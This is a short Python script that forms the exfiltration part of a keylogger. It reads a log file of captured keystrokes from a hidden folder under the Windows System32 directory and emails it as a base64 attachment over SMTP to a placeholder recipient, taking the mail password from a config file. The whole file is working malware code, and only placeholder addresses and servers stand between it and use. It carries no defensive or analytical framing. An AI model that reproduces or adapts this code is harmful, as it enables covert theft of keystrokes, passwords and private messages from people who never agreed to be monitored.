import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

log_file = "C:\\Windows\\System32\\keylogger\\key_log.txt"

def get_email_password_from_config():
    with open('config.txt', 'r') as config_file:
        for line in config_file:
            if line.startswith("EMAIL_PASSWORD"):
                return line.split('=')[1].strip()

def send_email():
    from_address = "your_email@example.com"
    to_address = "recipient_email@example.com"
    subject = "Keylogger Logs"
    body = "Attached are the keylogger logs."
    
    email_password = get_email_password_from_config()

    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    with open(log_file, "r") as log:
        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(log.read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_file)}')
        msg.attach(attachment)

    try:
        server = smtplib.SMTP('smtp.example.com', 587)  # Atualize com o servidor SMTP correto
        server.starttls()
        server.login(from_address, email_password)
        text = msg.as_string()
        server.sendmail(from_address, to_address, text)
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

if __name__ == "__main__":
    send_email()

